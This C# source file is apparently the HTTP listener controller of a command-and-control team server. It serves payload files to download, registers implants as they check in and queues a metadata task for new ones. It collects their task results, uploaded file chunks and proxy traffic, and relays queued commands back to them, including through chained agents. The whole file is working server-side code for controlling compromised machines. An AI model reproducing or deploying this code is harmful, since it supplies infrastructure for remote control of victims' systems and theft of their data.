using ApiModels.Response;
using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Mvc;
using Microsoft.Extensions.Logging;
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using TeamServer.Models.File;
using TeamServer.Services;

namespace TeamServer.Models
{
    [Controller]
    public class HttpListenerController : ControllerBase
    {
        private IAgentService _agentService;
        private IFileService _fileService;
        private IListenerService _listenerService;
        private IBinMakerService _binMakerService;
        private ILoggerFactory _loggerFactory;

        public HttpListenerController(IAgentService agentService, IFileService fileService, IListenerService listenerService, IBinMakerService binMakerService, ILoggerFactory loggerFactory)
        {
            this._agentService=agentService;
            this._fileService = fileService;
            this._listenerService = listenerService;
            this._binMakerService = binMakerService;
            this._loggerFactory = loggerFactory;
        }


        public async Task<IActionResult> WebHost(string id)
        {
            //var logger = _loggerFactory.CreateLogger("WebHost");
            //logger.LogInformation($"{id}");
            string fileName = Path.GetFileName(id);

            var listener = this._listenerService.GetListeners().FirstOrDefault(l => l.Uri == this.Request.GetListenerUri());

            if (listener == null)
            {
                //logger.LogError($"NOT FOUND {fileName} => No listener at {this.Request.GetListenerUri()}");
                Logger.Log($"NOT FOUND {fileName} => No listener at {this.Request.GetListenerUri()}");
                return this.NotFound();
            }

            var path = _fileService.GetListenerPath(listener.Name);
            path = Path.Combine(path, fileName);

            if (!System.IO.File.Exists(path))
            {
                //logger.LogError($"NOT FOUND {fileName} from listener {listener.Name}");
                Logger.Log($"NOT FOUND {fileName} from listener {listener.Name}");
                return this.NotFound();
            }

            Logger.Log($"GET {fileName} from listener {listener.Name}");

            return this.File(System.IO.File.ReadAllBytes(path), "application/octet-stream");
        }


        public async Task<IActionResult> HandleImplant(string id)
        {
            var agent = this.CheckIn(id);

            //string calledUri = this.Request.GetListenerUri();

            //System.IO.File.AppendAllText("log.log", calledUri + Environment.NewLine);

            var listener = this._listenerService.GetListeners().FirstOrDefault(l => l.Uri == this.Request.GetListenerUri());
            if (listener != null)
            {
                //System.IO.File.AppendAllText("log.log", $"Found listener {listener.Id} with {listener.Uri}" + Environment.NewLine);
                agent.ListenerId = listener.Id;
            }

            if (HttpContext.Request.Method == "POST")
            {
                string json;
                using (var sr = new StreamReader(HttpContext.Request.Body))
                    json = await sr.ReadToEndAsync();

                var result = JsonConvert.DeserializeObject<List<MessageResult>>(json);

                foreach(var messRes in result)
                {
                    var agentId = messRes.Header.Owner;
                    var messAgent = this.CheckIn(messRes.Header.Owner);
                  
                    if (messRes.MetaData != null)
                        messAgent.Metadata = messRes.MetaData;

                    messAgent.AddTaskResults(messRes.Items);
                    messAgent.RelayId = id;
                    messAgent.Path = messRes.Header.Path;
                    if(messRes.FileChunk != null)
                         _fileService.AddAgentFileChunk(messRes.FileChunk);

                    messAgent.AddProxyResponses(messRes.ProxyMessages);

                    ////Logger.Log($"Saving resulst of {messAgent.Metadata.Id}");
                    _fileService.SaveResults(messAgent, messRes.Items);
                }

            }

            var messages = new List<MessageTask>();
            foreach (var ag in this._agentService.GetAgentToRelay(id))
            {
                var mess = ag.GetNextMessage();
                if (mess != null)
                    messages.Add(mess);
            }
          
            return Ok(messages);
        }

        private Agent CheckIn(string agentId)
        {
            var agent = this._agentService.GetAgent(agentId);
            if (agent == null)
            {
                agent = new Agent(agentId);
                agent.QueueTask(new AgentTask() { Command = "meta", Id = Guid.NewGuid().ToString(), Label = "MetaData", RequestDate = DateTime.Now });
                this._agentService.AddAgent(agent);
            }

            agent.CheckIn();
            return agent;
        }



        private AgentMetadata ExtractMetadata(IHeaderDictionary headers)
        {
            //Auhorization: Bearer <base64>
            if (!headers.TryGetValue("Authorization", out var encodedMetaDataHeader))
                return null;

            var encodedMetaData = encodedMetaDataHeader.ToString();

            if (!encodedMetaData.StartsWith("Bearer "))
                return null;

            encodedMetaData = encodedMetaData.Substring(7, encodedMetaData.Length - 7);

            var json = Encoding.UTF8.GetString(Convert.FromBase64String(encodedMetaData));
            return JsonConvert.DeserializeObject<AgentMetadata>(json);
        }
    
    }
}
